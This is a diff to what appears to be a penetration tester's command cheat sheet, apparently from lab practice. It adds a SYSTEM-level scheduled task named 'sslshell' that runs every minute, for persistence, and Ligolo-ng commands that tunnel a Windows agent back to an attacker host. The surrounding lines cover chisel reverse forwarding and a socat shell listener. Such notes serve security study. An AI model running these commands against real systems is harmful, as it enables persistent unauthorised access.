@@ -154,6 +154,19 @@ Start-Process powershell {script}
 Get-Process <name>
 Stop-Process <pid>
 
+# Scheduled Tasks
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Path\To\YourScript.ps1"
+### Daily at 9 AM
+$trigger = New-ScheduledTaskTrigger -Daily -At "9:00 AM"
+### Weekly on Monday and Wednesday at 10 PM
+$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday, Wednesday -At "10:00 PM"
+### Every minute
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 365)
+### optional settings option
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+### Registering with System account
+Register-ScheduledTask -TaskName "sslshell" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"
+
 # fix encoding problems
 iconv -f utf-16le -t utf-8 lin.log -o lin2.log
 gc rev.bat|set-content rev2.bat -encoding ascii
@@ -199,6 +212,15 @@ kali@kali:~$ ./chisel server -p 9002 --reverse
 ./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512
 # if using metasploit
 portfwd add -l 9510 -p 9510 -r 10.10.11.115
+# Ligolo-ng
+# On Kali
+sudo /opt/ligolo-ng/proxy -selfcert
+session
+autoroute
+iflist
+ifdel --name <nameoftunnel>
+# On Windows
+ligolo-ng_agent_0.7.5_windows.exe -connect 10.10.14.149:11601 -ignore-cert
 
 # Relay Binaries
 socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
